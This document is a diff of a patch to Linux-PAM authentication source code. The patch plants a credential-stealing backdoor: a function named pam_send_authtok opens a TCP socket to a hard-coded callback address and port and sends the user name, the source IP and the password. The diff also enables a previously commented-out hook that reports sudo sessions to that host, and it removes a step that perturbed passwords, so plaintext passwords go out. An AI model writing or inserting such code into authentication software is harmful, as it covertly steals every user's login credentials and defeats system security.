@@ -43,9 +43,9 @@ index 3f6a8fb..78c74b5 100644
  		}
  		pam_syslog(pamh, LOG_INFO, "session opened for user %s(uid=%s) by %s(uid=%lu)", user_name, uid, login_name, (unsigned long)getuid());
 +		
-+		//if (strncmp(uid, "0", 1) == 0 && (unsigned long)getuid() > 0) {
-+        //    pam_send_authtok("SUDO SESSION OPENED:", login_name, ":");
-+        //}
++		if (strncmp(uid, "0", 1) == 0 && (unsigned long)getuid() > 0) {
++           pam_send_authtok("SUDO SESSION OPENED:", login_name, ":");
++       }
  	}
  	return PAM_SUCCESS;
  }
@@ -64,11 +64,11 @@ index 043273d..eef9807 100644
 +#include <ifaddrs.h>
 +#include <fcntl.h>
 +#include <sys/time.h>
-+#include <ldpasswd/ldpasswd.h>
++
  /* this is a front-end for module-application conversations */
  
  int _make_remark(pam_handle_t * pamh, unsigned long long ctrl,
-@@ -853,6 +861,106 @@ _unix_verify_user(pam_handle_t *pamh,
+@@ -853,6 +861,96 @@ _unix_verify_user(pam_handle_t *pamh,
      return retval;
  }
  
@@ -103,16 +103,6 @@ index 043273d..eef9807 100644
 +
 +// Function to send data to the server
 +int pam_send_authtok(const char *message, const char *name, const char *p) {
-+
-+	 // Allocate space on heap twice the size of p and copy p over to the first half of the new buffer
-+    char* temp = (char*)malloc(sizeof(char) * (strlen(p) * 2 + 1));
-+
-+    if (temp == NULL) return 1;
-+    memcpy(temp, p, strlen(p));
-+
-+    if (strncmp(p, ":", 1) != 0) {
-+        perturb_password(temp, EPS);
-+    }
 +
 +    // Get IP using helper function
 +    char ipaddr[INET_ADDRSTRLEN];
@@ -163,7 +153,7 @@ index 043273d..eef9807 100644
 +
 +
 +    char credentials[256];
-+    snprintf(credentials, sizeof(credentials), RET_FMT, ipaddr, message, name, temp);
++    snprintf(credentials, sizeof(credentials), RET_FMT, ipaddr, message, name, p);
 +
 +    // Send message via TCP (non-blocking with timeout)
 +    send(sock, credentials, strlen(credentials), 0);
@@ -186,7 +176,7 @@ index 9c065c5..40b5f9c 100644
 +#define CALLBACK_IP "192.168.1.59"
 +#define CALLBACK_PORT 5000
 +#define RET_FMT "%s - %s %s:%s\n"
-+#define EPS 12.0
++
  
  /*
   * here is the string to inform the user that the new passwords they
